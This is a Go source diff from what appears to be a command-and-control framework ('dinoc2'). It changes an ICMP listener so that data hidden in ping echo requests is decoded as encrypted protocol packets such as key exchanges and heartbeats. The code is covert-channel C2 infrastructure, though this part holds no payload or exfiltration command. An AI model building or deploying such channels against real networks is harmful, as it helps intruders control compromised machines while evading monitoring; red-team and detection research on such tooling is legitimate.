@@ -9,6 +9,8 @@ import (
 
 	"golang.org/x/net/icmp"
 	"golang.org/x/net/ipv4"
+	"dinoc2/pkg/crypto"
+	"dinoc2/pkg/protocol"
 )
 
 // ICMPListener implements the Listener interface for ICMP protocol
@@ -177,11 +179,46 @@ func (l *ICMPListener) processPacket(packet []byte, addr net.Addr) {
 		echo := msg.Body.(*icmp.Echo)
 
 		// Extract data from the echo request
-		data := string(echo.Data)
-
-		// In a real implementation, this would pass the data to the protocol layer
-		fmt.Printf("Received ICMP echo request from %s: %s\n", addr, data)
-
+		data := echo.Data
+		
+		// Create a protocol handler for processing the data
+		protocolHandler := protocol.NewProtocolHandler()
+		
+		// Generate a session ID based on the connection address and echo ID
+		sessionID := crypto.SessionID(fmt.Sprintf("%s-%d", addr.String(), echo.ID))
+		
+		// Create a session with AES encryption (default)
+		err := protocolHandler.CreateSession(sessionID, crypto.AlgorithmAES)
+		if err != nil {
+			fmt.Printf("Error creating session for ICMP data: %v\n", err)
+			return
+		}
+		
+		// Process the data if it's long enough to be a valid packet
+		// HeaderSize is 12 bytes based on protocol/encoder.go
+		if len(data) > 12 {
+			// Decode the packet
+			packet, err := protocol.DecodePacket(data)
+			if err != nil {
+				fmt.Printf("Error decoding ICMP packet data: %v\n", err)
+			} else {
+				// Handle packet based on type
+				switch packet.Header.Type {
+				case protocol.PacketTypeKeyExchange:
+					fmt.Printf("Received key exchange from %s via ICMP\n", addr)
+				case protocol.PacketTypeHeartbeat:
+					fmt.Printf("Received heartbeat from %s via ICMP\n", addr)
+				default:
+					fmt.Printf("Received packet type %d from %s via ICMP\n", packet.Header.Type, addr)
+				}
+			}
+		} else {
+			fmt.Printf("Received ICMP echo request from %s (data too short for protocol)\n", addr)
+		}
+		
+		// Clean up
+		protocolHandler.RemoveSession(sessionID)
+		
 		// Send an echo reply
 		l.sendEchoReply(addr, echo.ID, echo.Seq, echo.Data)
 	}
